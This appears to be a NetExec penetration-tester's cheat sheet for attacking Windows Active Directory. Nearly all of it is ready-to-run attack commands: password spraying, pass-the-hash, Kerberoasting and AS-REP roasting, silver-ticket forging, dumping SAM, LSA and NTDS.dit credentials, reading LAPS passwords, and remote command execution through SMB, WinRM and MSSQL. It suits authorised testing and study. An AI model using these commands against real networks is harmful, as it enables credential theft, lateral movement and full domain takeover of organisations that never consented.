https://www.netexec.wiki

NOTE: Pwn3d! means code exec and RDP possible.
## General Usage

```bash
# NETEXEC CHEATSHEET | <T>=Target <D>=Domain <U>=User <P>=Pass <H>=Hash <S>=SID
# === AUTH & SPRAY ================================================================
nxc smb <T> -u <U> -p <P> --pass-pol                   # Check pass policy first
nxc smb <T> -u usr.txt -p pw.txt --continue-on-success # Spray combos
nxc smb <T> -u <U> -H <H> --local-auth                 # PtH against local
nxc smb <T> -u usr.txt -p <P> --no-bruteforce          # 1 try/user (no lockouts)

-d <domain>  # specify domain for domain auth

# === KERBEROS & TICKETS ==========================================================
-k, --kerberos # Use Kerberos auth
--use-kcache   # Use Kerberos authentication from ccache file 

nxc smb <ip> --generate-krb5-file krb5.conf            # Generate krb5conf file
sudo cp krb5.conf /etc/krb5.conf

nxc ldap <T> -u <U> -p <P> --asreproast asrep.txt      # Harvest TGTs (No preauth)
nxc ldap <T> -u <U> -p <P> --kerberoasting tgs.txt     # Harvest TGSs (Svc accts)
nxc smb <T> -u <U> -p <P> --generate-tgt <U>           # Req TGT -> <U>.ccache
getST.py -spn cifs/<T> <D>/<U>:<P>                     # Constrained Deleg TGS
# Forge Silver Ticket (Requires target service account NT hash)
ticketer.py -nthash <H> -domain-sid <S> -domain <D> -spn cifs/<T> Administrator
export KRB5CCNAME=t.ccache; nxc smb <T> --use-kcache   # Pass-the-Ticket (PtT)

# === ENUM & SECRETS ==============================================================
nxc ldap <T> -u <U> -p <P> --users --groups            # Users and Groups
nxc ldap <T> -u <U> -p <P> -M tombstone -o ACTION=query# Query for deleted users
	-M tombstone -o ACTION=restore ID=<ID> SCHEME=ldap # Restore deleted User
nxc smb <T> -u <U> -p <P> --rid-brute                  # RID Cycling
nxc smb <T> -u <U> -p <P> --shares                     # Shares
nxc smb <T> -u <U> -p <P> -M webdav                    # Webdav
nxc ldap <T> -u <U> -p <P> --trusted-for-delegation    # Unconstrained deleg
nxc ldap <T> -u <U> -p <P> -M maq                      # MachineAccountQuota
nxc ldap <T> -u <U> -p <P> -M adcs                     # AD Certificate Services
nxc ldap <T> -u <U> -p <P> -M bloodhound -o COLLECTION_METHOD=All # BloodHound
nxc smb <T> -u <U> -p <P> --sam                        # Dump SAM hashes
nxc smb <T> -u <U> -p <P> --lsa                        # Dump LSA secrets
nxc smb <T> -u <U> -p <P> --ntds                       # Dump NTDS.dit (DC)
nxc ldap <T> -u <U> -p <P> -M laps                     # Read LAPS passwords

# === EXECUTION ===================================================================
nxc smb <T> -u <U> -p <P> -x "cmd"                     # CMD exec (wmiexec)
nxc winrm <T> -u <U> -p <P> -X "ps1"                   # PS exec via WinRM
nxc mssql <T> -u <U> -p <P> -M mssql_priv -x "cmd"     # MSSQL xp_cmdshell
nxc mssql <T> -u <U> -p <P> -M spider_plus -o DOWNLOAD_FLAG=True# Spider + Download
```

Spraying with user-pass combos
```bash
# Spray with user-pass COMBOS (list must be in user:pass format)
nxc smb <ip> -C (or --combo) <user_pass_list> --continue-on-success

# SSH is annoying and you have to have individual files that align on each line 
nxc ssh <ip> -u user_list.txt -p pass_list.txt --no-bruteforce
```

Enumerate users with `nxc ldap` -- if `ldapsearch` returns anything successful, do this!!!
```bash
# Users (if anon ldapsearch returns stuff, use blank user and pass fields...)
nxc ldap <ip> -u '' -p '' --users  # --users might miss some if they have no data

# FULL DUMP 
nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=*)" "" # parse very carefully
| grep -i 'member' # might reveal additional users but do NOT rely on only this...

# Description fields
nxc ldap <ip> -d '<domain_name>' -u '<user>' -p '<password>' -M get-desc-users
```

## Collect Bloodhound data
```bash
# Bloodhound CE
nxc ldap '<dc_hostname.domain>(or IP address)' -d '<domain_name>' -u '<user>' -p '<password>' --bloodhound -c All --dns-server <ip_address (usually of DC)>

# Bloodhound legacy? use bloodhound-python

# proxychains
proxychains -q nxc ldap DC1.ad.lab -d 'ad.lab' -u 'john.doe' -p 'P@$$word123!' --bloodhound -c All --dns-server 10.80.80.2 --dns-tcp
```

## Troubleshooting

STATUS_PASSWORD_MUST_CHANGE
```bash
# STATUS_PASSWORD_MUST_CHANGE means we must change the password before use
nxc smb <ip> -u <target> -p <pass> -M change-password -o NEWPASS='h@cK3d!!!!!!'
```